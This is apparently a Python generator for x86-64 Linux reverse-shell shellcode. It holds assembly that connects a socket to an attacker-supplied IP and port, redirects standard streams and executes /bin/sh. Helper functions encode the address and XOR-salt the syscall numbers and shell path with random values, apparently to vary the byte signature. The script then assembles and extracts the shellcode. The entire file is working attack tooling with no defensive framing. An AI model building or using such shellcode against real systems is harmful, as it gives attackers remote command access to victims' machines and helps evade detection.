import socket
import random
import subprocess
import os
import sys

asm=[
 	'global _start',
 	'_start:',
 	'push 0x2',
 	'pop rdi',
 	'xor rsi,rsi',
 	'inc rsi',
 	'xor rdx, rdx',
 	'push 0x29',
 	'pop rax',
 	'syscall',
 	'xchg rax, rdi',
 	'xor rax, rax',
 	'push rax',
 	'mov ebx , *IP*', #13
 	'not ebx',
 	'mov dword [rsp-4], ebx',
 	'sub rsp , 4 ',
 	'push word *PORT*', #17
 	'push word 0x02 ',
 	'push rsp',
 	'pop rsi',  
 	'push 0x10',
 	'pop rdx',
 	'push 0x2a',
 	'pop rax',
 	'syscall',
 	'push 0x02',
	'pop rsi',
	'label0x292929:',
	'xor rdx, rdx',
	#'push *XORD*', #28
	'mov dl, *XORD*',
	#'pop rdx',
	'xor dl, *XORD*', #30
	'push rdx',
	'pop rax',
	'syscall',
	'dec rsi',
	'jns label0x292929',
	'xor rdx, rdx',
	'push rdx',
	'mov rbx, *XORD*', #38
	'xor bx, *XORD*', #39
	'push rbx',
	'mov rdi, rsp',
	'push rdx',
	'push rdi',
	'mov rsi, rsp',
	'xor rbx, rbx',
	'mov bl, *XORD*', #46
	'xor bl, *XORD*', #47
	'push rbx',
	'pop rax',
	'syscall'
]
'''

asm=[
	'global _start',
	'_start:',
	'xor rax, rax',
	'xor rsi, rsi ',
	'mul rsi',
	'add rcx, 0x3',       
	'push byte 0x2',
	'pop rdi',
	'inc esi',
	'push byte 0x29',
	'pop rax',
	'syscall',
	'xchg rax, rdi',
	'xor rax, rax',
	'push rax',                    
	'mov ebx , *IP*', #15
	'not ebx',
	'mov dword [rsp-4], ebx',
	'sub rsp , 4  ',
	'push word *PORT*', #19
	'push word 0x02',
	'push rsp',
	'pop rsi',
	'push 0x10',
	'pop rdx',
	'push 0x2a',
	'pop rax',
	'syscall',
	'push 0x3 ',                          
	'pop rsi',
	'duplicate:',
	'dec esi   ',                         
	'mov al, 0x21',
	'syscall',
	'jne duplicate',
	#'push rsp',
	#'pop rsi',
	#'xor rax, rax',
	#'syscall',
	#'push 0x6b636168',
	#'pop rax',
	#'lea rdi, [rel rsi]',
	#'scasd',
	'xor rsi , rsi',
	'mul rsi ', 
	'push ax  ',
	'mov rbx , 0x68732f2f6e69622e',
	'inc rbx',
	'add rcx, 2',
	'push rbx',
	'push rsp',
	'pop rdi ',
	'push byte 0x3b',
	'pop rax',
	'syscall'
]'''

def ip_sub(ip):
	octets=ip.split(".")
	octets=[hex(~(int(o))&0xFF) for o in octets]

	ips='0x'
	for o in reversed(octets):
		ips+=o[2:].rjust(2, '0')

	return ips

def port_sub(port):
	return ((hex(socket.htonl(port)))[:6]).rstrip('0')

def rand_xor(num, half=False):
	size=(num.bit_length() + 7) // 8
	if half:
		salt=random.getrandbits(16)
	else:
		salt=random.getrandbits(size*8)
	num^=salt
	return (hex(num), hex(salt))

def prepare(asm, ip, port):
	#ip
	'''
	asm[15]=asm[15].replace("*IP*", ip_sub(ip))
	#port
	asm[19]=asm[19].replace("*PORT*", port_sub(port))
	'''

	asm[13]=asm[13].replace("*IP*", ip_sub(ip))
	asm[17]=asm[17].replace("*PORT*", port_sub(port))
	#dup2
	(num, salt)=rand_xor(0x21)
	asm[30]=asm[30].replace("*XORD*", num)
	asm[31]=asm[31].replace("*XORD*", salt)
	#/bin/bash
	(num, salt)=rand_xor(0x68732f2f6e69622f, True)
	asm[39]=asm[39].replace("*XORD*", num)
	asm[40]=asm[40].replace("*XORD*", salt)
	#execve
	(num, salt)=rand_xor(0x3b)
	asm[47]=asm[47].replace("*XORD*", num)
	asm[48]=asm[48].replace("*XORD*", salt)
	return asm

def getShellCode(asm, path):
	os.chdir(path)
	
	try:
		os.mkdir("temp")
	except:
		pass
	
	os.chdir(path+"/temp")

	with open('temp.nasm', 'w') as ifile:
		for line in asm:
			ifile.write(line+"\n")

	cmdline=subprocess.Popen(['nasm', '-f', 'elf64', 'temp.nasm', '-o', 'temp.o'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	r=cmdline.stdout.read()
	cmdline=subprocess.Popen(['ld', 'temp.o', '-o', 'temp'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	r=cmdline.stdout.read()

	cmdline=os.popen(f"objdump -D temp|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/\"/'|sed 's/$/\"/g'")
	shellcode=cmdline.read()
	cmdline.close()

	with open('temp.py', 'w') as ifile:
		ifile.write(f"buff={shellcode}")

	sys.path.insert(1, path+'/temp')
	from temp import buff


	ch=[hex(ord(i)) for i in buff]
	ch.insert(-29, '0x2f') #-18
	
	os.chdir(path)
	os.system("rm -r temp")
	
	return ch

